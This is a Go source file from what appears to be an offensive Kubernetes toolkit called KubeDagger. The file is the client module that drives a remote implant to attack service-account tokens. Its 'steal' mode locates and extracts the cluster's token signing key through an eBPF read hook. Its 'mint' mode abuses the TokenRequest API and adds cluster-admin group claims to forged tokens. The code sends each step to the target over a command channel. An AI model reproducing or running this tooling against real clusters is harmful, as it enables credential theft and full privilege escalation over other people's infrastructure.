package sa_token

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/shared"
)

type MintResult struct {
	Actions []shared.ActionInfo `json:"actions"`
	Success bool               `json:"success"`
}

func Execute(target, action, serviceAccount, namespace, audience, output string) error {
	result := &MintResult{}

	var actions []struct {
		name   string
		detail string
		cmd    string
	}

	switch action {
	case "steal":
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"locate_signing_key", "find SA token signing key from controller-manager args or mounted secrets", "sa_locate_key"},
			{"extract_key", "extract private key material via eBPF read hook on key file", "sa_extract_key"},
			{"decode_existing", "decode existing tokens to understand claim structure", "sa_decode_token"},
		}
	default: // mint
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"enumerate_sa", "list service accounts and their RBAC bindings in target namespace", "sa_enumerate"},
			{"request_token", "abuse TokenRequest API to mint token with elevated audience", "sa_request"},
			{"escalate_claims", "modify token claims to add cluster-admin group binding", "sa_escalate"},
			{"validate_token", "verify minted token grants expected permissions via SelfSubjectReview", "sa_validate"},
		}
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + action + "#" + serviceAccount + "#" + namespace + "#" + audience
		status := shared.SendCommand(target, "/sa_token", cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}
